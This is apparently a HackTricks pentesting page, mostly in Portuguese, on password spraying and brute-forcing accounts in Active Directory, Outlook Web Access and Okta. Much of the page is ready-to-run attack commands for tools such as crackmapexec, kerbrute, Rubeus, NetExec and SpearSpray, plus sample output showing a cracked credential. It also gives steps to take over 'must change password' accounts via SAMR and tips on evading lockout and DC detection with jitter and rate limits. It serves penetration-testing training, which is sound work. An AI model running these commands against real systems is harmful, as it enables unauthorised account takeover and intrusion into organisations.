# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Uma vez que você tenha encontrado vários **valid usernames**, você pode tentar as **most common passwords** (tenha em mente a **password policy** do ambiente) com cada um dos discovered users.\
Por **default** o **minimum password length** é **7**.

Listas de common usernames também podem ser úteis: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Observe que você **could lockout some accounts if you try several wrong passwords** (por **default** mais de 10).

### Obter password policy

Se você tiver algumas user credentials ou um shell como domain user, você pode **obter a password policy com**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploração a partir do Linux (ou todos)

- Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Usando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(você pode indicar o número de tentativas para evitar bloqueios):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NÃO RECOMENDADO, ÀS VEZES NÃO FUNCIONA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Com o módulo `scanner/smb/smb_login` do **Metasploit**:

![](<../../images/image (745).png>)

- Usando **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Do Windows

- Usando a versão do [Rubeus](https://github.com/Zer1t0/Rubeus) com o brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Com [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Ele pode gerar usuários do domínio por padrão, obterá a política de senhas do domínio e limitará as tentativas de acordo com ela):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Com [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identificar e assumir contas "Password must change at next logon" (SAMR)

Uma técnica de baixo ruído é usar password spraying com uma senha benign/empty e detectar contas que retornam STATUS_PASSWORD_MUST_CHANGE, o que indica que a senha foi forçosamente expirada e pode ser alterada sem conhecer a antiga.

Fluxo de trabalho:
- Enumerar usuários (RID brute via SAMR) para construir a lista de alvos:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Faça password spraying com senha vazia e continue após acertos para capturar contas que devem alterar a senha no próximo logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Para cada acerto, altere a senha via SAMR com o módulo do NetExec (não é necessária a senha antiga quando "must change" está definida):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Notas operacionais:
- Garanta que o relógio do host esteja sincronizado com o DC antes de operações baseadas em Kerberos: `sudo ntpdate <dc_fqdn>`.
- Um [+] sem (Pwn3d!) em alguns módulos (por exemplo, RDP/WinRM) significa que os creds são válidos, mas a conta não possui direitos de logon interativo.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying com direcionamento LDAP e limitação ciente de PSO (SpearSpray)

Kerberos pre-auth–based spraying reduz ruído vs tentativas de bind SMB/NTLM/LDAP e se alinha melhor com as políticas de lockout do AD. O SpearSpray combina direcionamento baseado em LDAP, um pattern engine e awareness de políticas (domain policy + PSOs + buffer do badPwdCount) para spray de forma precisa e segura. Também pode taggar principals comprometidos no Neo4j para pathing do BloodHound.

Key ideas:
- LDAP user discovery com paginação e suporte a LDAPS, opcionalmente usando filtros LDAP customizados.
- Domain lockout policy + PSO-aware filtering para deixar um buffer configurável de tentativas (threshold) e evitar bloquear usuários.
- Kerberos pre-auth validation usando bindings gssapi rápidos (gera 4768/4771 nos DCs ao invés de 4625).
- Geração de senha por usuário baseada em pattern, usando variáveis como nomes e valores temporais derivados do pwdLastSet de cada usuário.
- Controle de throughput com threads, jitter e máximo de requests por segundo.
- Integração opcional com Neo4j para marcar usuários com controle para BloodHound.

Uso básico e descoberta:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Segmentação e controle de padrões:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controles de sigilo e segurança:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enriquecimento:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Visão geral do sistema de padrões (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Variáveis disponíveis incluem:
- {name}, {samaccountname}
- Temporais a partir do pwdLastSet de cada usuário (ou whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Ajudantes de composição e token da org: {separator}, {suffix}, {extra}

Notas operacionais:
- Prefira consultar o PDC-emulator com -dc para obter o badPwdCount mais autoritativo e informações relacionadas à política.
- Os resets de badPwdCount são acionados na próxima tentativa após a janela de observação; use o limiar e a temporização para agir com segurança.
- As tentativas de pré-autenticação Kerberos aparecem como 4768/4771 na telemetria do DC; use jitter e rate-limiting para se misturar.

> Dica: O tamanho de página LDAP padrão do SpearSpray é 200; ajuste com -lps conforme necessário.

## Outlook Web Access

Existem várias ferramentas para p**assword spraying outlook**.

- Com [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Com [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Com [Ruler](https://github.com/sensepost/ruler) (confiável!)
- Com [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Com [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Para usar qualquer uma dessas ferramentas, você precisa de uma lista de usuários e de uma senha / uma pequena lista de senhas para spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referências

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
